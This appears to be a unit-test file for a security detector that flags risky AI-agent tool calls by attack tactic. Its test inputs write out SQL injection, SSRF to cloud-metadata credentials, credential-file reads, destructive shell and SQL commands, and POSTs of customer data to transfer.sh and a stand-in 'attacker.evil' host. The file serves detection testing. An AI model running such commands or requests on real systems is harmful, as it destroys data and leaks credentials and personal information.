"""
Sprint 3 — Security Objectives unit tests.

Two layers:

  1. **Per-module smoke** — give each detector a canonical bag that should
     fire its primary signal; assert the signal is in the returned list.
     Catches the case where a future refactor accidentally drops a rule.

  2. **Drift assertion** — every signal in the registry that's per-call
     (i.e. emitted by the canonical orchestrator, not by upstream
     plumbing like the risk_pipeline or session-intel) must have AT LEAST
     ONE objective module that can emit it for some canonical input.
     Catches the case where a signal becomes orphaned after a refactor.

These tests are unit-level (pure-Python, no I/O), so they're fast and
reliable in CI.
"""
from __future__ import annotations


from services.policy.canonical import normalize
from services.security.objectives import (
    collection,
    credential_access,
    defense_evasion,
    discovery,
    exfiltration,
    impact,
    initial_access,
    persistence,
    privilege_escalation,
)


# ───── Per-module smoke tests ──────────────────────────────────────────────

def test_initial_access_emits_sql_injection():
    c = normalize("tool.sql_query", {
        "query": "SELECT id FROM products UNION SELECT ssn FROM customers",
        "row_limit": 1,
    })
    assert "sql_injection_detected" in initial_access.detect(c)


def test_initial_access_emits_ssrf_triad():
    """P0-1 2026-06-21 — SSRF (file:// / cloud-metadata / RFC1918) is a
    P0 brutal-review finding. Verifies the three flavours are independently
    detectable from the canonical bag."""
    # file:// scheme — local file read via URL fetcher.
    c = normalize("tool.http_request", {"url": "file:///etc/passwd", "method": "GET"})
    assert c.get("is_ssrf_local_file") is True
    assert "ssrf_local_file" in initial_access.detect(c)

    # Cloud-instance-metadata endpoint — IAM-credential theft vector.
    c = normalize("tool.http_request", {
        "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "method": "GET",
    })
    assert c.get("is_ssrf_cloud_metadata") is True
    assert "ssrf_cloud_metadata" in initial_access.detect(c)

    # RFC1918 internal-network address — pivot vector.
    c = normalize("tool.http_request", {"url": "http://10.0.0.1/admin", "method": "GET"})
    assert c.get("is_ssrf_internal_network") is True
    assert "ssrf_internal_network" in initial_access.detect(c)

    # Sanity: legitimate external URL must NOT trip any of the SSRF flags.
    c = normalize("tool.http_request", {
        "url": "https://api.weatherapi.com/v1/current.json",
        "method": "GET",
    })
    assert c.get("is_ssrf_local_file") is False
    assert c.get("is_ssrf_cloud_metadata") is False
    assert c.get("is_ssrf_internal_network") is False
    assert not (set(initial_access.detect(c)) & {
        "ssrf_local_file", "ssrf_cloud_metadata", "ssrf_internal_network",
    })


def test_persistence_emits_credential_artifact_write():
    c = normalize("tool.shell", {"command": "echo backdoor-creds > /tmp/.creds"})
    assert "credential_artifact_write" in persistence.detect(c)


def test_privilege_escalation_emits_three_variants():
    # privilege_escalation_attempt (admin literal)
    c = normalize("tool.sql_query", {
        "query": "INSERT INTO users (role) VALUES ('admin')",
        "row_limit": 1,
    })
    assert "privilege_escalation_attempt" in privilege_escalation.detect(c)
    # identity_table_write (no admin literal)
    c2 = normalize("tool.sql_query", {
        "query": "DELETE FROM users WHERE id=1",
        "row_limit": 1,
    })
    assert "identity_table_write" in privilege_escalation.detect(c2)
    # privilege_url_access
    c3 = normalize("tool.http_request", {
        "url": "/users/reset-password", "method": "POST",
        "body": {"username": "x", "new_password": "y"},
    })
    assert "privilege_url_access" in privilege_escalation.detect(c3)


def test_defense_evasion_emits_control_plane_write():
    c = normalize("tool.sql_query", {
        "query": "DELETE FROM audit_logs WHERE timestamp > now() - INTERVAL '1 hour'",
        "row_limit": 0,
    })
    assert "aegis_control_plane_write" in defense_evasion.detect(c)


def test_defense_evasion_emits_control_plane_destructive_ddl():
    c = normalize("tool.sql_query", {"query": "DROP TABLE audit_logs", "row_limit": 0})
    assert "aegis_control_plane_destructive_ddl" in defense_evasion.detect(c)


def test_credential_access_distinguishes_cloud_vs_ssh():
    c_aws = normalize("tool.read_file", {"path": "/root/.aws/credentials"})
    assert "cloud_credential_path" in credential_access.detect(c_aws)
    c_ssh = normalize("tool.read_file", {"path": "/root/.ssh/id_rsa"})
    assert "ssh_credential_path" in credential_access.detect(c_ssh)
    c_etc = normalize("tool.read_file", {"path": "/etc/passwd"})
    assert "system_sensitive_path" in credential_access.detect(c_etc)


def test_discovery_emits_schema_recon_and_external_get():
    c_recon = normalize("tool.sql_query", {
        "query": "SELECT table_name FROM information_schema.tables",
        "row_limit": 100,
    })
    assert "schema_recon" in discovery.detect(c_recon)
    c_get = normalize("tool.http_request", {
        "url": "https://api.weatherapi.com/v1/current.json",
        "method": "GET",
    })
    assert "external_get" in discovery.detect(c_get)


def test_collection_tier_thresholds():
    c_dump = normalize("tool.sql_query", {
        "query": "SELECT name, ssn FROM customers LIMIT 50000",
        "row_limit": 50000,
    })
    assert "bulk_pii_egress_dump" in collection.detect(c_dump)
    c_escalate = normalize("tool.sql_query", {
        "query": "SELECT name, ssn FROM customers LIMIT 500",
        "row_limit": 500,
    })
    assert "bulk_pii_egress_above_threshold" in collection.detect(c_escalate)
    c_compress = normalize("tool.shell", {
        "command": "tar czf /tmp/customers.tgz /var/data/customers",
    })
    assert "compression_for_exfil" in collection.detect(c_compress)


def test_exfiltration_known_dest_with_pii():
    c = normalize("tool.http_request", {
        "url": "https://transfer.sh/x.tgz", "method": "POST",
        "body": {"data": "customer list with ssn"},
    })
    out = exfiltration.detect(c, known_exfil_dests=("transfer.sh",))
    assert "known_exfil_destination" in out
    assert "external_pii_exfil" in out


def test_exfiltration_unknown_dest_with_pii_escalates():
    c = normalize("tool.http_request", {
        "url": "https://attacker.evil/dump", "method": "POST",
        "body": {"customer_dump": "with ssn and credit_card"},
    })
    out = exfiltration.detect(c, known_exfil_dests=())
    assert "external_post_pii_unknown_dest" in out


def test_impact_emits_all_destruction_classes():
    c_ddl = normalize("tool.sql_query", {"query": "DROP TABLE customers", "row_limit": 0})
    assert "destructive_sql_ddl" in impact.detect(c_ddl)
    c_dml = normalize("tool.sql_query", {
        "query": "DELETE FROM customers WHERE 1=1", "row_limit": 0,
    })
    assert "destructive_sql_dml_no_predicate" in impact.detect(c_dml)
    c_sh = normalize("tool.shell", {"command": "rm -rf /var/data"})
    assert "destructive_shell_command" in impact.detect(c_sh)
    c_k8s = normalize("tool.shell", {
        "command": "kubectl delete namespace production --force",
    })
    assert "k8s_destruction_prod" in impact.detect(c_k8s)
    c_iac = normalize("tool.shell", {
        "command": "cd /opt/prod-infra && terraform destroy -auto-approve",
    })
    assert "iac_destruction_prod" in impact.detect(c_iac)
    c_wire = normalize("tool.http_request", {
        "url": "/wires/initiate", "method": "POST",
        "amount_usd": 25_000_000, "recipient": "BENEFICIARY-OFFSHORE-001",
    })
    assert "money_transfer_above_hard_cap" in impact.detect(c_wire)


# ───── Drift assertion ────────────────────────────────────────────────────

# Signals NOT emitted from the canonical per-call orchestrator (they come
# from elsewhere — risk_pipeline cumulative rules, session-intel, or
# behavior baseline). The drift test below excludes these.
_NON_CANONICAL_SIGNALS = {
    # Cumulative / cross-call signals — emitted by services/policy/
    # risk_pipeline.py + cross_agent_correlation.py + the gateway middleware,
    # never by the per-call canonical detectors.
    "attack_chain_match",
    "cross_agent_kill_chain",
    "behavior_baseline_drift",
    "slow_exfil_cumulative_threshold_breached",
    "long_window_cumulative_breach",
    # MONITOR-tier informational variants emitted by local_action_semantics.py's
    # MONITOR branch (after tier decision), not by the canonical orchestrator.
    "compression_observed",
    "known_exfil_destination_hit",
    # Fallback regex variants in local_action_semantics.py's _iac_destruction
    # and _k8s_prod_destruction helpers — these fire on raw command_norm
    # (legacy path), not on canonical flags. Sprint 8 will move them into
    # the impact objective once the rego/Python convergence lands.
    "iac_destruction_command",
    "k8s_prod_namespace_destruction",
}


def test_every_per_call_signal_has_an_owning_objective():
    """Drift guard: every registered signal that's emitted by the canonical
    orchestrator must be reachable from at least one objective module
    given SOME input. If a signal becomes orphaned (no module emits it),
    this test fails — that's a coverage regression worth catching."""
    from services.security.signal_registry import registered_signal_names
    from services.security.objectives import DETECTORS

    # Build an emission inventory by running every objective module
    # against a representative sweep of canonical inputs.
    sweep_inputs = [
        ("tool.sql_query", {"query": "SELECT id FROM products UNION SELECT ssn FROM customers"}),
        ("tool.sql_query", {"query": "SELECT name, ssn FROM customers LIMIT 50000", "row_limit": 50000}),
        ("tool.sql_query", {"query": "SELECT name, ssn FROM customers LIMIT 500", "row_limit": 500}),
        ("tool.sql_query", {"query": "DROP TABLE customers", "row_limit": 0}),
        ("tool.sql_query", {"query": "DELETE FROM customers WHERE 1=1", "row_limit": 0}),
        ("tool.sql_query", {"query": "DROP TABLE audit_logs", "row_limit": 0}),
        ("tool.sql_query", {"query": "DELETE FROM audit_logs WHERE 1=1", "row_limit": 0}),
        ("tool.sql_query", {"query": "INSERT INTO users (role) VALUES ('admin')", "row_limit": 1}),
        ("tool.sql_query", {"query": "DELETE FROM users WHERE id=1", "row_limit": 1}),
        ("tool.sql_query", {"query": "SELECT table_name FROM information_schema.tables"}),
        ("tool.read_file", {"path": "/etc/passwd"}),
        ("tool.read_file", {"path": "/root/.aws/credentials"}),
        ("tool.read_file", {"path": "/root/.ssh/id_rsa"}),
        ("tool.shell", {"command": "echo backdoor > /tmp/.creds"}),
        ("tool.shell", {"command": "rm -rf /var/data"}),
        ("tool.shell", {"command": "tar czf /tmp/customers.tgz /var/data/customers"}),
        ("tool.shell", {"command": "kubectl delete namespace production --force"}),
        ("tool.shell", {"command": "kubectl delete namespace staging"}),
        ("tool.shell", {"command": "cd /opt/prod-infra && terraform destroy -auto-approve"}),
        ("tool.shell", {"command": "cd /opt/sandbox && terraform destroy"}),
        ("tool.http_request", {"url": "/users/reset-password", "method": "POST",
                                "body": {"username": "x", "new_password": "y"}}),
        ("tool.http_request", {"url": "https://api.weatherapi.com/v1/current.json", "method": "GET"}),
        ("tool.http_request", {"url": "https://transfer.sh/x.tgz", "method": "POST",
                                "body": {"data": "customer list with ssn"}}),
        ("tool.http_request", {"url": "https://attacker.evil/dump", "method": "POST",
                                "body": {"customer_dump": "with ssn"}}),
        ("tool.http_request", {"url": "/wires/initiate", "method": "POST",
                                "amount_usd": 25_000_000, "recipient": "BENEFICIARY-OFFSHORE-001"}),
        ("tool.http_request", {"url": "https://vendor.com/wire", "method": "POST",
                                "amount_usd": 250_000, "recipient": "BENEFICIARY-VENDOR"}),
        # P0-1 2026-06-21 — SSRF triad coverage.
        ("tool.http_request", {"url": "file:///etc/passwd", "method": "GET"}),
        ("tool.http_request", {"url": "http://169.254.169.254/latest/meta-data/", "method": "GET"}),
        ("tool.http_request", {"url": "http://10.0.0.1/admin", "method": "GET"}),
    ]

    seen: set[str] = set()
    for tool, args in sweep_inputs:
        c = normalize(tool, args)
        for mod in DETECTORS:
            if mod.__name__.endswith("exfiltration"):
                emitted = mod.detect(c, ("transfer.sh", "pastebin.com"))
            else:
                emitted = mod.detect(c)
            seen.update(emitted)

    expected_per_call = registered_signal_names() - _NON_CANONICAL_SIGNALS
    missing = expected_per_call - seen
    assert not missing, (
        f"signal(s) registered but not emitted by any objective module: {sorted(missing)}. "
        "Either add a rule in the appropriate objectives/<tactic>.py, "
        "or mark the signal as upstream-emitted by adding it to "
        "_NON_CANONICAL_SIGNALS in this test."
    )


def test_orchestrator_unions_objective_outputs():
    """The orchestrator must call all detectors and union/dedup the result.
    Regression guard against accidentally dropping a module from the
    DETECTORS tuple."""
    from services.policy.canonical import _signals_from_canonical
    # An input that fires across multiple objectives:
    # - DDL (impact) + control-plane (defense_evasion).
    c = normalize("tool.sql_query", {"query": "DROP TABLE audit_logs", "row_limit": 0})
    findings, score = _signals_from_canonical(c)
    assert "aegis_control_plane_destructive_ddl" in findings
    assert "destructive_sql_ddl" in findings
    # MAX-score from the strongest finding (quarantine-tier = 100).
    assert score == 100
    # No duplicates.
    assert len(findings) == len(set(findings))
